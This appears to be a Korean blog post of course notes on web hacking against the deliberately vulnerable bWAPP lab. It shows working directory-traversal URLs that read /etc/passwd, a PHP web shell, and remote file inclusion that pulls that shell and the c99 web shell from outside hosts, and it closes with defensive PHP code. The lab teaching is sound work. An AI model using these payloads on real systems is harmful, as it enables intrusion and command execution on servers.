---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - 디렉터리 리스팅/파일 삽입
"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part7 A7
  - 기능 수준의 접근 통제 누락
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 20강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## 기능 수준의 접근 통제 누락

* 접근 통제와 확인이 서버의 설정이나 관리 측면에서 누락 시 발생

![image](https://user-images.githubusercontent.com/28076542/52838702-ed418580-3136-11e9-9540-5d636fb041a8.png)

* LFI와 RFI는 파일을 첨부하는 것
* 파일 업로드보단 파일 다운로드에 초점을 맞춰볼 것

---

## Directory Traversal - Directories

![image](https://user-images.githubusercontent.com/28076542/52838906-97b9a880-3137-11e9-817f-052ba9160b31.png)

* URL: `https://192.168.190.143:8443/bWAPP/directory_traversal_2.php?directory=documents`
* **documents**는 `/var/www/bWAP/documents`에 존재
* URL: `https://192.168.190.143:8443/bWAPP/directory_traversal_2.php?directory=../../../../etc`를 입력하면 etc 폴더의 내용을 볼 수 있음

### etc 폴더 확인

![image](https://user-images.githubusercontent.com/28076542/52839012-f97a1280-3137-11e9-8513-3d3d55a1456b.png)

---

## Directory Traversal - Files

![image](https://user-images.githubusercontent.com/28076542/52852234-5a671200-315b-11e9-92b6-4781817a1217.png)

* URL: `https://192.168.190.143:8443/bWAPP/directory_traversal_1.php?page=message.txt`에서
* URL: `https://192.168.190.143:8443/bWAPP/directory_traversal_1.php?page=../../../../../../../etc/passwd`로 접속

### etc/passwd 파일 확인

![image](https://user-images.githubusercontent.com/28076542/52852360-b16ce700-315b-11e9-85fb-df6948df0ce2.png)

---

## LFI 와 RFI

![image](https://user-images.githubusercontent.com/28076542/52852433-ebd68400-315b-11e9-951c-01ea799abdf2.png)

* LFI: PHP에 서버 내부에 있는 파일을 가져오는 것
* RFI: PHP에 서버 외부에 있는 파일을 가져오는 것

---

## Remote & Local File Inclusion (RFI/LFI)

![image](https://user-images.githubusercontent.com/28076542/52852567-57205600-315c-11e9-84a5-82d0bff362ff.png)

* English로 설정 후 Go 버튼을 누르면 URL이 다음과 같이 바뀜
* URL: `https://192.168.190.143:8443/bWAPP/rlfi.php?language=lang_en.php&action=go`
* **lang_en.php**에서 파일을 가져옴 --> **LFI**

### LFI 방식으로 passwd 가져오기

![image](https://user-images.githubusercontent.com/28076542/52853230-483aa300-315e-11e9-8a00-650fad50ef2d.png)

* URL: `https://192.168.190.143:8443/bWAPP/rlfi.php?language=../../../../../../../etc/passwd&action=go`

### RFI 방식으로 passwd 가져오기

#### 1. rfi.php 파일을 다음과 같이 작성

```php
<?php echo "<script>alert(\"Succeed\")</script>";system($_GET["cmd"]);?>
```

#### 2. 터미널에서 python으로 서버 열기

```bash
root@ming:~# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
```

#### 3. URL에 접속하여 rfi.php 파일 확인

![image](https://user-images.githubusercontent.com/28076542/52853539-3c9bac00-315f-11e9-8bea-9c127aa6ee28.png)

* URL: `127.0.0.1:8000`으로 접속하면 파일을 볼 수 있음

#### 4. ifconfig로 칼리리눅스 ip 주소를 찾고 Bee-Box에서 다음과 같이 URL에 접속

```bash
root@ming:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.190.155  netmask 255.255.255.0  broadcast 192.168.190.255
        inet6 fe80::20c:29ff:fe1d:546c  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:1d:54:6c  txqueuelen 1000  (Ethernet)
        RX packets 31092  bytes 30218675 (28.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14655  bytes 2632085 (2.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5935  bytes 2258547 (2.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5935  bytes 2258547 (2.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![image](https://user-images.githubusercontent.com/28076542/52853709-bcc21180-315f-11e9-9414-55779ce6357c.png)

* URL: `https://192.168.190.143:8443/bWAPP/rlfi.php?language=http://192.168.190.155:8000/rfi.php&action=go`

#### 5. URL의 cmd 변수에 시스템 명령어를 삽입하여 파일 만들고 Bee-Box에서 파일 생성 확인

```bash
bee@bee-box:/var/www/bWAPP$ ls -l cmdtest
-rw-r--r-- 1 www-data www-data 4 2019-02-15 12:27 cmdtest
```

* URL: `https://192.168.190.143:8443/bWAPP/rlfi.php?language=http://192.168.190.155:8000/rfi.php&action=go&cmd=echo "abc" >cmdtest`

#### 6. RFI로 웹쉘을 가져올 수도 있음

![image](https://user-images.githubusercontent.com/28076542/52854201-1e36b000-3161-11e9-894b-9e6a3b4f71e5.png)

* URL: `https://192.168.190.143:8443/bWAPP/rlfi.php?language=https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php&action=go`

---

## 방어하는 코드

### functions_external.php

```php
function directory_traversal_check_2($data)

{
    // Not bulletproof

    $directory_traversal_error = "";  
    // Searches for special characters in the GET parameter
    if(strpos($data, "../") !== false ||

       strpos($data, "..\\") !== false ||

       strpos($data, "/..") !== false ||

       strpos($data, "\..") !== false ||

       strpos($data, ".") !== false)
    {
        $directory_traversal_error = "Directory Traversal detected!";
    }
    /*
    else
    {
     echo "Good path!";
    }
    */
    return $directory_traversal_error;
}
function directory_traversal_check_3($user_path,$base_path = "")
{
    $directory_traversal_error = "";
    $real_base_path = realpath($base_path);
    // echo "base path: " . $base_path . " real base path: " . $real_base_path . "<br />";
    $real_user_path = realpath($user_path);
    // echo "user path: " . $user_path . " real user path: " . $real_user_path . "<br />";
    // int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )
    // URL: http://php.net/manual/en/function.strpos.php
    if(strpos($real_user_path, $real_base_path) === false)
    {
        $directory_traversal_error = "<font color=\"red\">An error occurred, please try again.</font>";
    }
    /*
    else
    {
        echo "Good path!";
    }
     */
    return $directory_traversal_error;
}
```

* 일일이 필터링해서 방어하는 방법은 좋은 방법이 아님
* **directory_traversal_check_3** 함수처럼 해당 경로인지 확인하는 방법이 좋음

### rlfi.php

```php
$language = "";

if(isset($_GET["language"]))
{

    switch($_COOKIE["security_level"])
    {

        case "0" :

            $language = $_GET["language"];

            break;

        case "1" :

            $language = $_GET["language"] . ".php";

            break;

        case "2" :

            $available_languages = array("lang_en.php", "lang_fr.php", "lang_nl.php");
            $language = $_GET["language"] . ".php";

            // $language = rlfi_check_1($language);

            break;

        default :

            $language = $_GET["language"];         

            break;

    }

}
```

* **case 1**의 경우 `%00`을 삽입하면 문자열의 끝으로 인식되어 우회가 가능
* **case 2**와 같이 배열을 만들고 하나하나 비교하는 방법이 좋음